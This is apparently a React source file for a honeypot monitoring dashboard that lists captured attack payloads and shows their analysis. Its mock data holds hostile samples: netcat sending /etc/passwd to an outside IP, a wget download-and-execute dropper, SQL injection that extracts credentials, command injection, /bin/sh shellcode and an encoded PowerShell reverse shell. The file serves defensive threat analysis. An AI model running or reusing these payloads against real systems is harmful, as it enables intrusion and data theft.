import { useState } from 'react';
import {
  Search,
  Copy,
  Download,
  Unlock,
  FlaskConical,
  Filter,
  FileText,
  Terminal,
  Code,
  Globe,
  Database,
  FileCode,
  ChevronRight,
} from 'lucide-react';

const payloads = [
  { id: '1', timestamp: '2m ago', type: 'Command', preview: 'cat /etc/passwd | nc 45.33.32.156 4444', source: 'SSH-Honeypot-01', size: 42, sha256: 'a1b2c3d4e5f6...8901', content: 'cat /etc/passwd | nc 45.33.32.156 4444\n\n# Reverse shell attempt via netcat\n# Source: SSH session on port 22\n# Attacker: 45.33.32.156' },
  { id: '2', timestamp: '5m ago', type: 'HTTP Request', preview: 'GET /admin/config.php?cmd=ls+-la HTTP/1.1', source: 'HTTP-Honeypot-02', size: 256, sha256: 'b2c3d4e5f6a7...9012', content: 'GET /admin/config.php?cmd=ls+-la HTTP/1.1\nHost: 10.0.1.88\nUser-Agent: curl/7.88.1\nAccept: */*\n\n# Command injection attempt via HTTP parameter\n# Target: PHP configuration file' },
  { id: '3', timestamp: '8m ago', type: 'SQL Query', preview: 'UNION SELECT username, password FROM users--', source: 'HTTP-Honeypot-02', size: 128, sha256: 'c3d4e5f6a7b8...0123', content: 'SELECT * FROM products WHERE id = 1\nUNION SELECT username, password FROM users--\n\n# SQL injection attempt extracting credentials\n# Injection point: product search parameter' },
  { id: '4', timestamp: '15m ago', type: 'File', preview: '#!/bin/bash\nwget http://malware.site/bot.sh -O /tmp/bot.sh', source: 'SSH-Honeypot-01', size: 512, sha256: 'd4e5f6a7b8c9...1234', content: '#!/bin/bash\nwget http://malware.site/bot.sh -O /tmp/bot.sh\nchmod +x /tmp/bot.sh\n/tmp/bot.sh\n\n# Malware download and execution script\n# IOC: malware.site domain' },
  { id: '5', timestamp: '22m ago', type: 'Shellcode', preview: '\\x48\\x31\\xc0\\x48\\x89\\xe2\\x48...', source: 'HTTP-Honeypot-02', size: 89, sha256: 'e5f6a7b8c9d0...2345', content: '\\x48\\x31\\xc0\\x48\\x89\\xe2\\x48\\x89\\xc7\\x48\\x89\\xc6\\xeb\\x08\\x48\\x5e\\x6a\\x01\\x5f\\x6a\\x3b\\x58\\x0f\\x05\\xe8\\xf3\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\n\n# x86-64 Linux shellcode - execve("/bin/sh")\n# 89 bytes, position-independent' },
  { id: '6', timestamp: '30m ago', type: 'Command', preview: 'powershell -enc JABjAGwAaQBlAG4AdAA...', source: 'SSH-Honeypot-01', size: 1024, sha256: 'f6a7b8c9d0e1...3456', content: 'powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwBvAGMAawBlAHQAcwAuAFQAYwBwAEMAbABpAGUAbgB0AA==\n\n# Base64-encoded PowerShell reverse shell\n# Decoded: $client = New-Object Sockets.TcpClient' },
];

const TYPE_FILTERS = ['All', 'Command', 'HTTP Request', 'SQL Query', 'File', 'Shellcode', 'Other'];

const HONEYPOT_FILTERS = ['All Honeypots', 'SSH-Honeypot-01', 'HTTP-Honeypot-02', 'MySQL-Honeypot-03', 'DNS-Honeypot-05'];

function getTypeIcon(type: string) {
  switch (type) {
    case 'Command':
      return <Terminal className="w-3.5 h-3.5" />;
    case 'HTTP Request':
      return <Globe className="w-3.5 h-3.5" />;
    case 'SQL Query':
      return <Database className="w-3.5 h-3.5" />;
    case 'File':
      return <FileCode className="w-3.5 h-3.5" />;
    case 'Shellcode':
      return <Code className="w-3.5 h-3.5" />;
    default:
      return <FileText className="w-3.5 h-3.5" />;
  }
}

function getTypeBadgeColor(type: string) {
  switch (type) {
    case 'Command':
      return { bg: '#ff6b3520', text: '#ff6b35', border: '#ff6b3540' };
    case 'HTTP Request':
      return { bg: '#00d4ff20', text: '#00d4ff', border: '#00d4ff40' };
    case 'SQL Query':
      return { bg: '#a855f720', text: '#a855f7', border: '#a855f740' };
    case 'File':
      return { bg: '#22c55e20', text: '#22c55e', border: '#22c55e40' };
    case 'Shellcode':
      return { bg: '#ef444420', text: '#ef4444', border: '#ef444440' };
    default:
      return { bg: '#94a3b820', text: '#94a3b8', border: '#94a3b840' };
  }
}

function generateHexDump(content: string): string {
  const lines = content.split('\n').filter((l) => !l.startsWith('#'));
  const fullText = lines.join('\n');
  let result = '';
  for (let i = 0; i < fullText.length; i += 16) {
    const chunk = fullText.slice(i, i + 16);
    const offset = i.toString(16).padStart(8, '0');
    const hex = chunk
      .split('')
      .map((c) => c.charCodeAt(0).toString(16).padStart(2, '0'))
      .join(' ');
    const ascii = chunk
      .split('')
      .map((c) => (c.charCodeAt(0) >= 32 && c.charCodeAt(0) <= 126 ? c : '.'))
      .join('');
    const hexPadded = hex.padEnd(47, ' ');
    result += `${offset}  ${hexPadded}  |${ascii}|\n`;
    if (i > 128) {
      result += '...';
      break;
    }
  }
  return result;
}

export function PayloadsPage() {
  const [selectedId, setSelectedId] = useState<string | null>(payloads[0]?.id ?? null);
  const [searchQuery, setSearchQuery] = useState('');
  const [typeFilter, setTypeFilter] = useState('All');
  const [sourceFilter, setSourceFilter] = useState('All Honeypots');
  const [activeTab, setActiveTab] = useState<'Raw' | 'Decoded' | 'Hex Dump' | 'Analysis'>('Raw');
  const [copiedSha, setCopiedSha] = useState<string | null>(null);

  const selected = payloads.find((p) => p.id === selectedId);

  const filtered = payloads.filter((p) => {
    const matchesSearch =
      searchQuery === '' ||
      p.preview.toLowerCase().includes(searchQuery.toLowerCase()) ||
      p.content.toLowerCase().includes(searchQuery.toLowerCase()) ||
      p.sha256.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesType = typeFilter === 'All' || p.type === typeFilter;
    const matchesSource = sourceFilter === 'All Honeypots' || p.source === sourceFilter;
    return matchesSearch && matchesType && matchesSource;
  });

  const copySha = (sha: string) => {
    navigator.clipboard?.writeText(sha);
    setCopiedSha(sha);
    setTimeout(() => setCopiedSha(null), 1500);
  };

  const truncatePreview = (text: string, maxLen = 80) => {
    if (text.length <= maxLen) return text;
    return text.slice(0, maxLen) + '...';
  };

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#0d0d0d' }}>
      <div className="max-w-[1440px] mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Header */}
        <div className="mb-6">
          <h1 className="text-2xl font-bold" style={{ color: '#f1f5f9' }}>
            Payloads
          </h1>
          <p className="text-sm mt-1" style={{ color: '#94a3b8' }}>
            Captured payloads, commands, and attacker tooling
          </p>
        </div>

        {/* Split View */}
        <div className="flex gap-4" style={{ height: 'calc(100vh - 180px)' }}>
          {/* LEFT PANEL - 60% */}
          <div className="w-[60%] flex flex-col min-w-0">
            {/* Filter Bar */}
            <div
              className="admin-card rounded-lg border p-4 mb-4 flex flex-col gap-3"
              style={{ backgroundColor: '#1a1a1a', borderColor: '#2a2a2a' }}
            >
              <div className="flex items-center gap-3">
                <div className="relative flex-1">
                  <Search
                    className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4"
                    style={{ color: '#64748b' }}
                  />
                  <input
                    type="text"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    placeholder="Search payloads..."
                    className="w-full rounded-lg border pl-9 pr-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#ff6b35]"
                    style={{
                      backgroundColor: '#0d0d0d',
                      borderColor: '#2a2a2a',
                      color: '#f1f5f9',
                    }}
                  />
                </div>
              </div>
              <div className="flex items-center gap-3 flex-wrap">
                <div className="flex items-center gap-1.5">
                  <Filter className="w-3.5 h-3.5" style={{ color: '#64748b' }} />
                  <select
                    value={typeFilter}
                    onChange={(e) => setTypeFilter(e.target.value)}
                    className="rounded border px-2 py-1 text-xs focus:outline-none focus:ring-2 focus:ring-[#ff6b35]"
                    style={{
                      backgroundColor: '#0d0d0d',
                      borderColor: '#2a2a2a',
                      color: '#94a3b8',
                    }}
                  >
                    {TYPE_FILTERS.map((t) => (
                      <option key={t} value={t}>
                        {t}
                      </option>
                    ))}
                  </select>
                </div>
                <select
                  value={sourceFilter}
                  onChange={(e) => setSourceFilter(e.target.value)}
                  className="rounded border px-2 py-1 text-xs focus:outline-none focus:ring-2 focus:ring-[#ff6b35]"
                  style={{
                    backgroundColor: '#0d0d0d',
                    borderColor: '#2a2a2a',
                    color: '#94a3b8',
                  }}
                >
                  {HONEYPOT_FILTERS.map((h) => (
                    <option key={h} value={h}>
                      {h}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            {/* Payload List */}
            <div
              className="flex-1 overflow-y-auto rounded-lg border"
              style={{ backgroundColor: '#1a1a1a', borderColor: '#2a2a2a' }}
            >
              {filtered.map((payload) => {
                const badgeColor = getTypeBadgeColor(payload.type);
                const isSelected = payload.id === selectedId;

                return (
                  <button
                    key={payload.id}
                    onClick={() => setSelectedId(payload.id)}
                    className="w-full text-left px-4 py-3 border-b transition-colors hover:bg-[#222222]"
                    style={{
                      borderColor: isSelected ? '#ff6b35' : '#2a2a2a',
                      borderLeftWidth: isSelected ? '3px' : '0px',
                      borderLeftColor: '#ff6b35',
                      backgroundColor: isSelected ? '#1f1a17' : 'transparent',
                    }}
                  >
                    <div className="flex items-start justify-between gap-2 mb-1.5">
                      <div className="flex items-center gap-2">
                        <span
                          className="inline-flex items-center gap-1 rounded px-1.5 py-0.5 text-xs font-medium border"
                          style={{
                            backgroundColor: badgeColor.bg,
                            color: badgeColor.text,
                            borderColor: badgeColor.border,
                          }}
                        >
                          {getTypeIcon(payload.type)}
                          {payload.type}
                        </span>
                        <span className="text-xs" style={{ color: '#64748b' }}>
                          {payload.timestamp}
                        </span>
                      </div>
                      <span className="text-xs" style={{ color: '#64748b' }}>
                        {payload.source}
                      </span>
                    </div>
                    <p
                      className="font-mono text-xs mb-1.5 break-all"
                      style={{ color: '#f1f5f9' }}
                    >
                      {truncatePreview(payload.preview)}
                    </p>
                    <div className="flex items-center gap-3">
                      <span className="text-xs" style={{ color: '#64748b' }}>
                        {payload.size} bytes
                      </span>
                      <div className="flex items-center gap-1">
                        <span className="font-mono text-xs" style={{ color: '#64748b' }}>
                          {payload.sha256}
                        </span>
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            copySha(payload.sha256);
                          }}
                          className="p-0.5 rounded transition-colors hover:bg-[#2a2a2a]"
                        >
                          <Copy
                            className="w-3 h-3"
                            style={{
                              color: copiedSha === payload.sha256 ? '#ff6b35' : '#64748b',
                            }}
                          />
                        </button>
                      </div>
                    </div>
                  </button>
                );
              })}
              {filtered.length === 0 && (
                <div className="flex items-center justify-center py-12">
                  <p className="text-sm" style={{ color: '#64748b' }}>
                    No payloads match your filters
                  </p>
                </div>
              )}
            </div>
          </div>

          {/* RIGHT PANEL - 40% */}
          <div
            className="w-[40%] flex flex-col min-w-0 rounded-lg border overflow-hidden"
            style={{ backgroundColor: '#1a1a1a', borderColor: '#2a2a2a' }}
          >
            {selected ? (
              <>
                {/* Detail Header */}
                <div className="p-4 border-b" style={{ borderColor: '#2a2a2a' }}>
                  <div className="flex items-center gap-2 mb-2">
                    <ChevronRight className="w-4 h-4" style={{ color: '#ff6b35' }} />
                    <h3 className="font-semibold text-sm" style={{ color: '#f1f5f9' }}>
                      Payload Detail
                    </h3>
                    <span
                      className="inline-flex items-center gap-1 rounded px-1.5 py-0.5 text-xs font-medium border"
                      style={{
                        backgroundColor: getTypeBadgeColor(selected.type).bg,
                        color: getTypeBadgeColor(selected.type).text,
                        borderColor: getTypeBadgeColor(selected.type).border,
                      }}
                    >
                      {selected.type}
                    </span>
                  </div>
                  <div className="flex items-center gap-3 text-xs" style={{ color: '#64748b' }}>
                    <span>{selected.source}</span>
                    <span>{selected.timestamp}</span>
                    <span>{selected.size} bytes</span>
                  </div>
                </div>

                {/* Tabs */}
                <div
                  className="flex border-b px-4"
                  style={{ borderColor: '#2a2a2a' }}
                >
                  {(['Raw', 'Decoded', 'Hex Dump', 'Analysis'] as const).map((tab) => (
                    <button
                      key={tab}
                      onClick={() => setActiveTab(tab)}
                      className="px-3 py-2.5 text-xs font-medium border-b-2 transition-colors"
                      style={{
                        color: activeTab === tab ? '#ff6b35' : '#64748b',
                        borderColor: activeTab === tab ? '#ff6b35' : 'transparent',
                      }}
                    >
                      {tab}
                    </button>
                  ))}
                </div>

                {/* Code Viewer */}
                <div className="flex-1 overflow-y-auto p-4">
                  <div
                    className="rounded-lg p-4 font-mono text-sm overflow-x-auto whitespace-pre-wrap"
                    style={{
                      backgroundColor: '#1E293B',
                      color: '#E2E8F0',
                    }}
                  >
                    {activeTab === 'Raw' && selected.content}
                    {activeTab === 'Decoded' && (
                      <>
                        {selected.content}
                        {'\n\n'}
                        {'--- Decoded Output ---\n'}
                        {selected.type === 'Command' && selected.preview.includes('-enc')
                          ? '# Decoded from Base64:\n# $client = New-Object System.Net.Sockets.TcpClient("attacker.ip",4444)\n# $stream = $client.GetStream()\n# [byte[]]$bytes = 0..65535|%{0}'
                          : selected.type === 'HTTP Request'
                            ? '# URL Decoded:\n# cmd=ls -la\n# Decoded parameter shows command injection attempt'
                            : '# No additional decoding required - payload is in plaintext'}
                      </>
                    )}
                    {activeTab === 'Hex Dump' && generateHexDump(selected.content)}
                    {activeTab === 'Analysis' && (
                      <>
                        {'=== AI Analysis ===\n\n'}
                        {'Threat Classification: '}
                        {selected.type === 'Command'
                          ? 'Remote Code Execution / Reverse Shell'
                          : selected.type === 'HTTP Request'
                            ? 'Command Injection via HTTP'
                            : selected.type === 'SQL Query'
                              ? 'SQL Injection - Credential Extraction'
                              : selected.type === 'File'
                                ? 'Malware Dropper / Downloader'
                                : selected.type === 'Shellcode'
                                  ? 'Position-Independent Shellcode'
                                  : 'Unknown'}
                        {'\n\nSeverity: CRITICAL\n\n'}
                        {'=== Extracted IOCs ===\n'}
                        {selected.content.includes('45.33.32.156') && 'IP: 45.33.32.156\n'}
                        {selected.content.includes('malware.site') && 'Domain: malware.site\n'}
                        {selected.content.includes('4444') && 'Port: 4444 (C2 callback)\n'}
                        {'\n=== Decoded Strings ===\n'}
                        {selected.type === 'Shellcode'
                          ? 'String: /bin/sh\nFunction: execve() syscall\nArchitecture: x86-64'
                          : selected.type === 'File'
                            ? 'URL: http://malware.site/bot.sh\nTarget: /tmp/bot.sh\nAction: Download + Execute'
                            : selected.type === 'SQL Query'
                              ? 'Table: users\nColumns: username, password\nTechnique: UNION-based injection'
                              : 'No decoded strings available'}
                      </>
                    )}
                  </div>
                </div>

                {/* Action Buttons */}
                <div
                  className="p-4 border-t flex items-center gap-2 flex-wrap"
                  style={{ borderColor: '#2a2a2a' }}
                >
                  <button
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded text-xs font-medium border transition-colors hover:bg-[#2a2a2a]"
                    style={{ borderColor: '#2a2a2a', color: '#94a3b8' }}
                  >
                    <Copy className="w-3.5 h-3.5" />
                    Copy
                  </button>
                  <button
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded text-xs font-medium border transition-colors hover:bg-[#2a2a2a]"
                    style={{ borderColor: '#2a2a2a', color: '#94a3b8' }}
                  >
                    <Download className="w-3.5 h-3.5" />
                    Download
                  </button>
                  <button
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded text-xs font-medium border transition-colors hover:bg-[#2a2a2a]"
                    style={{ borderColor: '#2a2a2a', color: '#00d4ff' }}
                  >
                    <Unlock className="w-3.5 h-3.5" />
                    Decode Base64
                  </button>
                  <button
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded text-xs font-medium text-white transition-colors"
                    style={{ backgroundColor: '#ff6b35' }}
                  >
                    <FlaskConical className="w-3.5 h-3.5" />
                    Submit to Sandbox
                  </button>
                </div>

                {/* Metadata Panel */}
                <div className="p-4 border-t" style={{ borderColor: '#2a2a2a' }}>
                  <h4 className="text-xs font-medium mb-2" style={{ color: '#94a3b8' }}>
                    Metadata
                  </h4>
                  <div className="grid grid-cols-2 gap-x-4 gap-y-1.5">
                    <div>
                      <span className="text-xs" style={{ color: '#64748b' }}>
                        SHA256
                      </span>
                      <p className="font-mono text-xs" style={{ color: '#f1f5f9' }}>
                        {selected.sha256}
                      </p>
                    </div>
                    <div>
                      <span className="text-xs" style={{ color: '#64748b' }}>
                        SHA1
                      </span>
                      <p className="font-mono text-xs" style={{ color: '#f1f5f9' }}>
                        {selected.sha256.replace(/[.]{3}/, '...').slice(0, 16)}...{selected.id}
                        {selected.id}
                        {selected.id}
                      </p>
                    </div>
                    <div>
                      <span className="text-xs" style={{ color: '#64748b' }}>
                        MD5
                      </span>
                      <p className="font-mono text-xs" style={{ color: '#f1f5f9' }}>
                        {selected.sha256.slice(0, 8)}...{selected.id}
                        {selected.id}
                      </p>
                    </div>
                    <div>
                      <span className="text-xs" style={{ color: '#64748b' }}>
                        File Type
                      </span>
                      <p className="text-xs" style={{ color: '#f1f5f9' }}>
                        {selected.type === 'File'
                          ? 'Bourne-Again shell script'
                          : selected.type === 'Shellcode'
                            ? 'ELF x86-64 shellcode'
                            : selected.type === 'HTTP Request'
                              ? 'HTTP/1.1 request'
                              : selected.type === 'SQL Query'
                                ? 'SQL query text'
                                : 'ASCII text'}
                      </p>
                    </div>
                    <div>
                      <span className="text-xs" style={{ color: '#64748b' }}>
                        Size
                      </span>
                      <p className="text-xs" style={{ color: '#f1f5f9' }}>
                        {selected.size} bytes
                      </p>
                    </div>
                    <div>
                      <span className="text-xs" style={{ color: '#64748b' }}>
                        Entropy
                      </span>
                      <p className="text-xs" style={{ color: '#f1f5f9' }}>
                        {selected.type === 'Shellcode'
                          ? '7.89'
                          : selected.type === 'File'
                            ? '5.42'
                            : selected.type === 'Command'
                              ? '4.17'
                              : '3.84'}
                      </p>
                    </div>
                  </div>
                </div>
              </>
            ) : (
              <div className="flex-1 flex items-center justify-center">
                <div className="text-center">
                  <FileText className="w-8 h-8 mx-auto mb-2" style={{ color: '#64748b' }} />
                  <p className="text-sm" style={{ color: '#64748b' }}>
                    Select a payload to view details
                  </p>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
